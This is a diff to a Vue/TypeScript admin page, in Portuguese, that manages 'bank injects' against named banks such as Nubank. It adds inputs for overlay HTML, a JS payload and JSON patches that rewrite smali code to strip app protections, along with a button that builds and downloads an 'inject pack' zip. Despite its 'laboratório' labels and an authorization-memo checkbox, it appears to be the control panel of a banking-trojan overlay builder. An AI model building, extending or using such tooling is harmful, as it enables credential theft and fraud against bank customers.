@@ -52,6 +52,7 @@
             <td><span class="badge badge-success">Ativo</span></td>
             <td>{{ formatDate(inject.created_at) }}</td>
             <td class="actions-cell">
+              <button class="btn-sm btn-secondary" @click="buildPack(inject.id, inject.bank_name)">Pacote 📦</button>
               <button class="btn-sm btn-secondary" @click="deleteInject(inject.id)">Excluir 🗑️</button>
             </td>
           </tr>
@@ -85,6 +86,29 @@
             <label>Nome / Identificador</label>
             <input v-model="form.name" type="text" placeholder="Ex: Inject Nubank v2.0" required />
           </div>
+          <div class="form-group">
+            <label>Banco alvo (opcional)</label>
+            <input v-model="form.target_bank" type="text" placeholder="Padrão: igual ao banco" />
+          </div>
+          <div class="form-group">
+            <label>Overlay HTML (opcional — laboratório)</label>
+            <textarea v-model="form.overlay_html" rows="3" placeholder="<h1>Overlay de teste...</h1>"></textarea>
+          </div>
+          <div class="form-group">
+            <label>JS payload (opcional)</label>
+            <textarea v-model="form.js_payload" rows="2" placeholder="console.log('lab');"></textarea>
+          </div>
+          <div class="form-group">
+            <label>Protection patches JSON (opcional)</label>
+            <textarea v-model="form.protection_patches" rows="2" placeholder='[{"file":"smali/...","search":"...","replace":"..."}]'></textarea>
+          </div>
+          <div class="form-group form-check">
+            <label><input v-model="form.terms_accepted" type="checkbox" /> Uso autorizado em teste de segurança</label>
+          </div>
+          <div class="form-group">
+            <label>Memo de autorização</label>
+            <input v-model="form.auth_memo" type="text" placeholder="Quem autorizou + escopo (mín. 10 caracteres)" />
+          </div>
           <div class="modal-footer">
             <button type="button" class="btn btn-secondary" @click="showModal = false">Cancelar</button>
             <button type="submit" class="btn btn-primary" :disabled="isSubmitting">
@@ -100,24 +124,46 @@
 <script setup lang="ts">
 import { ref, onMounted } from 'vue';
 import axios from 'axios';
+import { useAuthStore } from '../stores/auth';
 
 const API_URL = import.meta.env.VITE_API_URL || 'http://localhost/api';
+const authStore = useAuthStore();
+const authHeaders = () => ({ Authorization: `Bearer ${authStore.token}` });
 
 const injects = ref<any[]>([]);
 const isLoading = ref(true);
 const showModal = ref(false);
 const isSubmitting = ref(false);
 
-const form = ref({
+const blankForm = () => ({
   bank_name: '',
-  name: ''
+  name: '',
+  target_bank: '',
+  overlay_html: '',
+  js_payload: '',
+  protection_patches: '',
+  terms_accepted: false,
+  auth_memo: ''
 });
+const form = ref(blankForm());
+
+const apiError = (err: any, fallback: string) => {
+  const data = err?.response?.data;
+  if (!data) return fallback;
+  if (typeof data.message === 'string') return data.message;
+  if (data.errors) {
+    const first = Object.values(data.errors)[0] as string[] | undefined;
+    if (first && first[0]) return first[0];
+  }
+  return fallback;
+};
 
 const loadInjects = async () => {
   isLoading.value = true;
   try {
-    const res = await axios.get(`${API_URL}/bank-injects`);
-    injects.value = res.data.data || res.data || [];
+    const res = await axios.get(`${API_URL}/bank-injects`, { headers: authHeaders() });
+    const list = res.data.data || res.data.items || res.data || [];
+    injects.value = Array.isArray(list) ? list : [];
   } catch (err) {
     console.error('Erro ao carregar injeções:', err);
   } finally {
@@ -128,24 +174,55 @@ const loadInjects = async () => {
 const handleCreateInject = async () => {
   isSubmitting.value = true;
   try {
-    await axios.post(`${API_URL}/bank-injects`, form.value);
+    const payload: Record<string, any> = { bank_name: form.value.bank_name, name: form.value.name };
+    if (form.value.target_bank) payload.target_bank = form.value.target_bank;
+    if (form.value.overlay_html) payload.overlay_html = form.value.overlay_html;
+    if (form.value.js_payload) payload.js_payload = form.value.js_payload;
+    if (form.value.protection_patches) payload.protection_patches = form.value.protection_patches;
+    if (form.value.terms_accepted) payload.terms_accepted = true;
+    if (form.value.auth_memo) payload.auth_memo = form.value.auth_memo;
+    await axios.post(`${API_URL}/bank-injects`, payload, { headers: authHeaders() });
     showModal.value = false;
-    form.value = { bank_name: '', name: '' };
+    form.value = blankForm();
     await loadInjects();
   } catch (err) {
-    alert('Erro ao criar injeção.');
+    alert(apiError(err, 'Erro ao criar injeção.'));
   } finally {
     isSubmitting.value = false;
+  }
+};
+
+const buildPack = async (id: number, bank: string) => {
+  try {
+    const res = await axios.post(`${API_URL}/bank-injects/${id}/build-pack`, {}, {
+      headers: authHeaders(), responseType: 'blob'
+    });
+    const url = window.URL.createObjectURL(new Blob([res.data]));
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `inject_pack_${id}_${bank || 'banco'}.zip`;
+    a.click();
+    window.URL.revokeObjectURL(url);
+  } catch (err: any) {
+    if (err?.response?.data instanceof Blob) {
+      const text = await (err.response.data as Blob).text();
+      try {
+        const parsed = JSON.parse(text);
+        alert(parsed.message || 'Pacote bloqueado: terms + memo obrigatórios.');
+      } catch { alert('Pacote bloqueado: terms + memo obrigatórios.'); }
+    } else {
+      alert(apiError(err, 'Erro ao gerar pacote.'));
+    }
   }
 };
 
 const deleteInject = async (id: number) => {
   if (!confirm('Deseja excluir esta injeção bancária?')) return;
   try {
-    await axios.delete(`${API_URL}/bank-injects/${id}`);
+    await axios.delete(`${API_URL}/bank-injects/${id}`, { headers: authHeaders() });
     await loadInjects();
   } catch (err) {
-    alert('Erro ao excluir injeção.');
+    alert(apiError(err, 'Erro ao excluir injeção.'));
   }
 };
 
@@ -197,8 +274,11 @@ onMounted(() => {
 
 .form-group { display: flex; flex-direction: column; gap: 0.5rem; margin-bottom: 1rem; }
 .form-group label { font-size: 0.85rem; font-weight: 500; color: var(--ink-muted); }
-.form-group input, .select-input { padding: 0.65rem; background: var(--surface-2); border: 1px solid var(--hairline); border-radius: var(--r-sm); color: var(--ink); outline: none; }
-.form-group input:focus, .select-input:focus { border-color: var(--accent); }
+.form-group input, .select-input, .form-group textarea { padding: 0.65rem; background: var(--surface-2); border: 1px solid var(--hairline); border-radius: var(--r-sm); color: var(--ink); outline: none; font-family: inherit; }
+.form-group input:focus, .select-input:focus, .form-group textarea:focus { border-color: var(--accent); }
+.form-check label { display: flex; align-items: center; gap: 0.5rem; cursor: pointer; }
+.modal-card { max-height: 90vh; overflow-y: auto; }
+.actions-cell { white-space: nowrap; display: flex; gap: 0.5rem; }
 
 .modal-footer { display: flex; justify-content: flex-end; gap: 0.75rem; margin-top: 1.5rem; }
 </style>
